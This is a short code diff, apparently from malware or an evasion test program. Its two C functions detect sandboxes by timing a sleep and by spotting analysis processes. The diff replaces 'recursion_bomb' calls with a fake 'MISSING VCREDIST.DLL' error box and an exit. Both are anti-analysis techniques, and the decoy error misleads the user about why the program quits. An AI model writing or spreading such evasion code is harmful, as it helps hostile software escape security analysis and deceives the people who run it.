@@ -12,7 +12,8 @@ void antiSleep()
 
     if (elapsed < 5000)
     {
-        recursion_bomb(100000000);
+        // recursion_bomb(100000);
+		MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
 		exit(1);
     }
 }
@@ -27,7 +28,8 @@ void auditProcesses()
 		wprintf(L"%s\n", susProcs[i]);
 		if (getPidByName(susProcs[i]) != -1)
 		{
-			recursion_bomb(10000000000);
+			// recursion_bomb(10000000);
+			MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
 			exit(1);
 		}
 	}
